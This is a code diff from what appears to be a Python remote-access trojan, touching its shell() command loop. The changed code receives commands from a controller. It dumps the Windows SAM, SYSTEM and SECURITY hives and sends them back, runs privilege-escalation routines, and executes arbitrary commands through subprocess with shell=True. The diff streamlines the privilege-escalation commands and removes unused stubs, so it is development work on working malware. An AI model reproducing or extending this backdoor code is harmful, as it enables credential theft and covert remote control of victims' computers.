@@ -180,12 +180,6 @@ def shell():
         command = reliable_recv()
         if command == 'quit':
             break
-        elif command == 'background' or command == 'bg':  # BEGIN
-            pass
-        elif command == 'help':  # ideally to be removed
-            pass
-        elif command == 'clear':
-            pass  # END
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
         elif command[:6] == 'upload':
@@ -246,27 +240,12 @@ def shell():
             sam_dump, system_dump, security_dump = get_sam_dump()
             reliable_send((sam_dump, system_dump, security_dump))
         
-        
-        #Needed to be implemented
-        elif command[:10] == 'privilege1':
+        elif command[:10] == 'privilege':
             try:
-                result = privilege.priv1()
+                result = privilege.priv()
                 reliable_send(result)
             except Exception as e:
                 reliable_send('[-] Failed to escalate privilege!',e)
-        elif command[:10] == 'privilege2':
-            try:
-                result = privilege.priv2()
-                reliable_send(result)
-            except Exception as e:
-                reliable_send('[-] Failed to escalate privilege!',e)
-        elif command[:10] == 'privilege3':
-            try:
-                result = privilege.priv3()
-                reliable_send(result)
-            except Exception as e:
-                reliable_send('[-] Failed to escalate privilege!',e)
-            
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
